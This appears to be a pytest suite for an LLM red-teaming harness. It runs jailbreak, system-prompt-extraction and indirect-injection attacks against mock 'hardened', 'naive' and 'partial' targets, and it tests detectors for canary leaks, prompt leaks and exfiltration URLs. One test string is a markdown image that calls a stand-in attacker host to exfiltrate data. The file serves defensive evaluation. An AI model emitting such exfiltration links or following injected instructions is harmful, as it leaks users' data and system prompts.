import json

import pytest

from redteam import detectors
from redteam.attacks import ATTACKS, CANARY, INJECTION_MARKER, SYSTEM_PROMPT
from redteam.cli import main
from redteam.report import render_json, render_markdown
from redteam.runner import run_all, summarise
from redteam.targets import CallableTarget, MockTarget, build_target


def test_corpus_ids_unique_and_detectors_known():
    ids = [a.id for a in ATTACKS]
    assert len(ids) == len(set(ids))
    assert all(d in detectors.DETECTORS for a in ATTACKS for d in a.detectors)


def test_detectors():
    assert detectors.canary_leak(f"code: {CANARY.lower().replace('-', ' ')}")
    assert detectors.canary_leak("nothing here") is None
    assert detectors.marker_compliance(f"ok {INJECTION_MARKER}")
    assert detectors.exfil_url("![x](https://attacker.example/c?d=1)")
    assert detectors.exfil_url("see https://acme.com") is None
    assert detectors.prompt_leak(SYSTEM_PROMPT[:80])
    assert detectors.prompt_leak("I help with refunds") is None
    assert detectors.is_refusal("Sorry, I can't do that")


def test_hardened_resists_everything_with_no_false_positives():
    s = summarise(run_all(MockTarget("hardened")))
    assert s["compromised"] == 0 and s["control_failures"] == 0


def test_naive_is_badly_compromised():
    s = summarise(run_all(MockTarget("naive")))
    assert s["asr"] >= 0.8
    assert s["control_failures"] == 0


def test_partial_sits_between_and_blocks_direct_attacks():
    naive = summarise(run_all(MockTarget("naive")))["asr"]
    partial_results = run_all(MockTarget("partial"))
    partial = summarise(partial_results)["asr"]
    assert 0 < partial < naive
    by_id = {r.attack_id: r for r in partial_results}
    assert not by_id["SP-003"].compromised
    assert by_id["IN-002"].compromised  # indirect exfil still works


def test_benign_control_flags_overzealous_detection():
    leaky = CallableTarget(lambda s, u: f"Sure, {CANARY}", "leaky")
    assert summarise(run_all(leaky))["control_failures"] == 1


def test_crashing_target_is_recorded_not_raised():
    def boom(s, u):
        raise RuntimeError("down")
    results = run_all(CallableTarget(boom))
    assert all(r.error and not r.compromised for r in results)
    assert summarise(results)["errors"] == len(ATTACKS)


def test_category_filter():
    results = run_all(MockTarget("naive"), categories={"jailbreak"})
    assert {r.category for r in results} == {"jailbreak"}


def test_reports():
    results = run_all(MockTarget("naive"))
    assert "COMPROMISED" in render_markdown("t", results)
    data = json.loads(render_json("t", results))
    assert data["summary"]["attacks"] == len(ATTACKS) - 1


def test_build_target_rejects_unknown():
    with pytest.raises(ValueError):
        build_target("gpt-nope")
    with pytest.raises(ValueError):
        MockTarget("bogus")


def test_cli_exit_codes(capsys):
    assert main(["list"]) == 0
    assert main(["run", "--target", "mock-hardened", "--fail-on-asr", "0.1"]) == 0
    assert main(["run", "--target", "mock-naive", "--fail-on-asr", "0.1"]) == 1
    assert main(["run", "--target", "nope"]) == 2
    capsys.readouterr()
